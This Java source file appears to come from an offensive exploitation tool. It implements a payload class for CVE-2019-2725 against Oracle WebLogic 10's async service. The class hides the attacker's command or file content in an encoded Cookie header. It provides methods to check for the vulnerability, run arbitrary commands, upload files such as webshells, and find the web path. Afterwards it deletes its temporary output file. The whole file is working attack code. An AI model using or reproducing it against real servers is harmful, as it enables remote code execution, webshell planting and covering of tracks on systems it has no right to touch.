/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.js.codeexec.paylaod;
import com.js.codeexec.tools.HttpTool;
import com.js.codeexec.tools.Tools;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Scanner;

/**
 *
 * @author shack2
 */
public class CVE_2019_2725_10 implements BasePayload {
    private static final String CheckStr="xml_test"; 
    private static final String VULURL="/_async/AsyncResponseService";
    private static final String FileAbsPath="/_async/"; 
    
    private static final String responsePath="favicon.ico";
    public String getExp(String path){ 
         InputStream in = this.getClass().getResourceAsStream(path);
          Scanner s = new Scanner(in).useDelimiter("\\A");
         String str = s.hasNext() ? s.next() : "";
         return str;
    }

    @Override
    public boolean checkVUL(String url) throws Exception{ 
        try {
           HashMap<String,String> map=new HashMap<String,String>();
           String data=Tools.str2Hex("a$$$$"+responsePath+"$$$$"+CheckStr);
           data=Tools.reverse(data);
           map.put("Cookie",data); 
           String VUL_CMD=getExp("/weblogic10_file.txt");
            HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, VUL_CMD,"UTF-8",map);
            String result=HttpTool.getHttpReuest(url+FileAbsPath+responsePath,"GBK");
            //删除临时文件
            data=Tools.str2Hex(responsePath);
            data=Tools.reverse(data);
            map.put("Cookie",data);  
            HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, getExp("/weblogic10_deleteFile.txt"),"UTF-8",map);
             if(result.startsWith(CheckStr)){
                    return true;
            }
        } catch (Exception e) {
           throw e;
        }
        return false;
        
    }

    @Override
    public String exeCMD(String url, String cmd,String encoding)  throws Exception{
        try {
            HashMap<String,String> map=new HashMap<String,String>();
           String data=Tools.str2Hex(cmd+"$$$$"+responsePath);
           data=Tools.reverse(data);
           map.put("Cookie",data); 
           String VUL_CMD=getExp("/weblogic10_cmd.txt");
           HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, VUL_CMD,"UTF-8",map);
           String result=HttpTool.getHttpReuest(url+FileAbsPath+responsePath,encoding);
            //删除临时文件
            data=Tools.str2Hex(responsePath);
            data=Tools.reverse(data);
            map.put("Cookie",data);  
            HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, getExp("/weblogic10_deleteFile.txt"),"UTF-8",map);
            return result;
        } catch (Exception e) {
           throw e;
        }

    }

     @Override
    public String uploadFile(String url,String fileContent, String filename,boolean useUserPath) throws Exception{
         try {
           String o="a";
            String  respath=url+FileAbsPath+filename;
           if(useUserPath){
               o="path";
                respath=filename;
           }
           HashMap<String,String> map=new HashMap<String,String>();
           String data=Tools.str2Hex(o+"$$$$"+filename+"$$$$"+fileContent);
           data=Tools.reverse(data);
           map.put("Cookie",data); 
           String VUL_File=getExp("/weblogic10_file.txt");
            HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, VUL_File,"UTF-8",map);
            return respath;
        } catch (Exception e) {
           throw e;
        }
    }

    @Override
    public String getWebPath(String url) throws Exception {
        try {
          
            HashMap<String,String> map=new HashMap<String,String>();
           String data=Tools.str2Hex(responsePath);
           data=Tools.reverse(data);
           map.put("Cookie",data); 
           String VUL_CMD=getExp("/weblogic10_path.txt");
           HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, VUL_CMD,"UTF-8",map);
           String result=HttpTool.getHttpReuest(url+FileAbsPath+responsePath,"UTF-8");
           //删除临时文件
            data=Tools.str2Hex(responsePath);
            data=Tools.reverse(data);
            map.put("Cookie",data);  
            HttpTool.postHttpReuestByXMLAddHeader(url+VULURL, getExp("/weblogic10_deleteFile.txt"),"UTF-8",map);
           return result;
        } catch (Exception e) {
           throw e;
        }
    }
    
}